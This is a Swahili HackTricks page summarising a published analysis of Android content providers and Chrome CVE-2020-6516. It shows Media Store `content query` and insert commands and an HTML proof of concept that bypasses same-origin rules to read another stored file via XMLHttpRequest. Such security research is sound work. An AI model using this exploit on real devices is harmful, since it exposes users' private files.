<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


**Hii ni muhtasari wa chapisho [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Orodha ya Faili katika Media Store
Ili kuorodhesha faili zinazosimamiwa na Media Store, unaweza kutumia amri ifuatayo:
```bash
$ content query --uri content://media/external/file
```
Kwa matokeo rahisi kueleweka zaidi, onyesha tu kitambulisho na njia ya kila faili iliyohifadhiwa:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Watoaji wa yaliyomo wamejikita katika eneo lao binafsi. Upatikanaji wa watoaji unahitaji `content://` URI maalum. Taarifa kuhusu njia za kupata watoaji zinaweza kupatikana kutoka kwa maandishi ya maombi au msimbo wa chanzo wa Android.

### Upatikanaji wa Chrome kwa Watoaji wa Yaliyomo
Chrome kwenye Android inaweza kupata watoaji wa yaliyomo kupitia mpango wa `content://`, ikiruhusu kupata rasilimali kama picha au hati zilizosafirishwa na programu za tatu. Ili kuonyesha hili, faili inaweza kuingizwa kwenye Duka la Vyombo vya Habari na kisha kupatikana kupitia Chrome:

Ingiza kuingia desturi kwenye Duka la Vyombo vya Habari:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Gundua kitambulisho cha faili iliyoingizwa hivi karibuni:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Faili hilo linaweza kuonekana kwenye Chrome kwa kutumia URL iliyojengwa na kitambulisho cha faili.

Kwa mfano, kuorodhesha faili zinazohusiana na programu maalum:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Kuvuka Sera ya Asili Iliyofanana

_Sera ya Asili Iliyofanana_ (SOP) ni itifaki ya usalama katika vivinjari ambayo inazuia kurasa za wavuti kuingiliana na rasilimali kutoka asili tofauti isipokuwa ikiwa imeidhinishwa wazi na sera ya _Cross-Origin-Resource-Sharing_ (CORS). Sera hii inalenga kuzuia uvujaji wa habari na udanganyifu wa ombi la tovuti nyingine. Chrome inachukulia `content://` kama mpango wa ndani, ikimaanisha kuwa kuna sheria kali za SOP, ambapo kila URL ya mpango wa ndani inachukuliwa kama asili tofauti.

Hata hivyo, CVE-2020-6516 ilikuwa ni udhaifu katika Chrome ambao uliruhusu kuvuka sheria za SOP kwa rasilimali zilizopakia kupitia URL ya `content://`. Kimsingi, msimbo wa JavaScript kutoka URL ya `content://` ulikuwa na uwezo wa kufikia rasilimali nyingine zilizopakia kupitia URL za `content://`, ambayo ilikuwa ni wasiwasi mkubwa wa usalama, hasa kwenye vifaa vya Android vinavyotumia toleo la chini ya Android 10, ambapo uhifadhi uliopangwa haukuwa umetekelezwa.

Uthibitisho wa dhana hii unadhihirisha udhaifu huu, ambapo hati ya HTML, baada ya kupakiwa chini ya **/sdcard** na kuongezwa kwenye Duka la Vyombo vya Habari, hutumia `XMLHttpRequest` katika JavaScript yake ili kupata na kuonyesha maudhui ya faili nyingine kwenye Duka la Vyombo vya Habari, kwa kuvuka sheria za SOP.

Uthibitisho wa Dhana ya HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
